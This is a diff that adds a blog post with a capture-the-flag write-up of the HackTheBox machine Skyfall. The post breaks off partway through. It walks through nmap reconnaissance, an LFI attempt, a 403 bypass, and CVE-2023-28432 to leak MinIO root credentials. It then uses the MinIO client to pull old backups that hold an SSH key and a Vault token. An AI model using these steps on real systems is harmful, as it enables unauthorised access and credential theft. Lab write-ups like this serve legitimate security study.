@@ -12,6 +12,400 @@
     </author>
     
       <item>
+        <title>Skyfall - HackTheBox</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;In today’s post you will find a solution write-up to the HackTheBox machine Skyfall. Let’s get to action?&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Reconnaissance&lt;/li&gt;
+  &lt;li&gt;Getting foothold&lt;/li&gt;
+  &lt;li&gt;System enumeration / Privilege Escalation&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;As always, we shall start the enumerating open ports with Nmap:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.129.78.160
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.78.160
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Skyfall - Introducing Sky Storage!
+No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+TCP/IP fingerprint:
+OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2/4%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;22%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44376%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65BF912F
+OS:%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;108%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;109%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+OS:O1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CNNT11NW7%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11
+OS:NW7%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+OS:R&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FAF0%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CNNSNW7%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS
+OS:%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T
+OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Network Distance: 2 hops
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 80/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HOP RTT       ADDRESS
+1   129.73 ms 10.10.14.1
+2   129.85 ms 10.129.78.160
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Feb  4 13:29:19 2024 -- 1 IP address (1 host up) scanned in 104.10 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The only open port available to us right now is port 80, which contains the following web service:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall1.png&quot; alt=&quot;skyfall homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After scrolling down, we find a link to http://demo.skyfall.htb. In order to make this accessible, we need to add this domain to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. We do this by simply opening Vim as root, and appending to the last line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; skyfall.htb demo.skyfall.htb&lt;/code&gt;. Now we are able to access this virtual host:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall2.png&quot; alt=&quot;demo skyfall login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This login page directly tells us a pair of credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest:guest&lt;/code&gt;. Upon accessing it as guest, we arrive at this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall3.png&quot; alt=&quot;demo skyfall dashboard&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This panel, despite being equipped with a variety of functionalities including file uploads and a URL fetcher, does not exhibit any apparent vulnerabilities. I’ve also tried to enumerate it with gobuster, but nothing was found.&lt;/p&gt;
+
+&lt;p&gt;After that, I decided to use BurpSuite and understand what was happening under the hood. I realized that when we pass a random string to the URL fetcher like below:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall4.png&quot; alt=&quot;url fetcher functionality&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We get a pop up response at the bottom right corner of the page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall5.png&quot; alt=&quot;error messsage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we try to fetch the own Skyfall website URL http://demo.skyfall.htb, we get this message:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall6.png&quot; alt=&quot;error disclosure&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indicating a simple name resolution error. After attempting other SSRF payloads, I got nowhere.&lt;/p&gt;
+
+&lt;p&gt;Next I analyzed the download functionality at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/files&lt;/code&gt; endpoint. Intercepting the request with Burp, we can find the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall7.png&quot; alt=&quot;burp download intercept&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We could try a LFI here by passing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to the filename URL parameter. This gives us:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall8.png&quot; alt=&quot;S3 disclosure&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This indicates there is a connection to some kind of cloud storage bucket. We can see that this storage might be MinIO, as we can see it on the navbar. If we click the MinIO metrics, we get a 403:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall9.png&quot; alt=&quot;metrics 403&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A simple 403 bypass worked to reveal the information of this page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall10.png&quot; alt=&quot;metrics 403&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At the bottom of these metrics, we find another endpoint:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall11.png&quot; alt=&quot;production endpoint&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After adding it to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file and accessing it, we get a 403 response, which cannot be simply bypassed as we did with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/metric&lt;/code&gt; endpoint.&lt;/p&gt;
+
+&lt;p&gt;With a simple google search, I was able to find &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-28432&quot;&gt;this&lt;/a&gt; CVE which worked. This CVE references information disclosure vulnerability in MinIO’s endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify&lt;/code&gt;, which is another 403 bypass. Following &lt;a href=&quot;https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/&quot;&gt;this&lt;/a&gt; article, we see that changing the request method from GET to POST leaks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_PASSWORD&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_USER&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/skyfall12.png&quot; alt=&quot;leaked info&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, I took a step back and started reading MinIO’s documentation. I could find that there is a way to communicate with MinIO through a CLI interface. There is a command to interactively work with the S3 storage from the terminal with MinIO Client &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mc&lt;/code&gt;. We can check it how to use it &lt;a href=&quot;https://min.io/docs/minio/linux/reference/minio-mc.html&quot;&gt;here&lt;/a&gt;. To install MinIO Client CLI, we run the following command in Linux:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://dl.min.io/client/mc/release/linux-amd64/mc &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;--create-dirs&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/minio-binaries/mc
+
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/minio-binaries/mc
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/minio-binaries/
+
+mc &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the documentation, we can see that to connect our machine to MinIO, we need to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mc alias set myminio https://minioserver.example.net ACCESS_KEY SECRET_KEY&lt;/code&gt;, where the access key being the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_USER&lt;/code&gt; and the secret key the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_PASSWORD&lt;/code&gt; values we found earlier. If everything is done correctly, we should get this message:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;alias set &lt;/span&gt;myminio http://prd23-s3-backend.skyfall.htb &amp;lt;MINIO_ROOT_USER&amp;gt; &amp;lt;MINIO_ROOT_PASSWORD&amp;gt;
+Added &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;myminio&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can list the files with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; myminio
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:28 GMT]  48KiB STANDARD askyy/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:37:25 GMT] 2.5KiB STANDARD askyy/home_backup.tar.gz
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:36 GMT]  48KiB STANDARD btanner/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:56 GMT]  48KiB STANDARD emoneypenny/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:36:02 GMT]  48KiB STANDARD gmallory/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 00:08:05 GMT]  48KiB STANDARD guest/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:45 GMT]  48KiB STANDARD jbond/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:36:09 GMT]  48KiB STANDARD omansfield/Welcome.pdf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:51 GMT]  48KiB STANDARD rsilva/Welcome.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that there is a backup file laying around. We can use MinIO Client to copy files to our local machine using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cp&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; myminio/askyy/home_backup.tar.gz &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+...kup.tar.gz: 2.48 KiB / 2.48 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 30.23 KiB/s 0s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will make a copy of the backup file in your local machine current’s directory. After unziping the file and analyzing it, I’ve found an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; file which could not be used to login as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askyy&lt;/code&gt; user. Looking back at the MinIO’s documentation, I realized we can also list file versions with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version&lt;/code&gt; flag. That’s what I did next:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--versions&lt;/span&gt; myminio/askyy/home_backup.tar.gz
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:37:25 GMT] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:37:09 GMT] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:36:30 GMT] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There were three different versions of this backup, and we downloaded the latest one, v3. The first version is interesting, since it is way larger than the other two. However, it also had nothing very interesting on it. Then, I downloaded the second version and found another endpoint and a HashiCorp vault token. First, to download a older MinIO’s file version, we must run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc undo myminio/askyy/home_backup.tar.gz &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--last&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt;
+✓ Last upload of &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;home_backup.tar.gz&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;vid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;25835695-5e73-4c13-82f7-30fd2da2cf61&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is reverted.
+✓ Last upload of &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;home_backup.tar.gz&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;vid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2b75346d-2a47-4203-ab09-3c9f878466b8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is reverted.
+✓ Last upload of &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;home_backup.tar.gz&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;vid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3c498578-8dfe-43b7-b679-32a3fe42018f&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is reverted.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we download the file with the cp command, but passing the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version-id&lt;/code&gt; followed by the UUID of that file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--version-id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
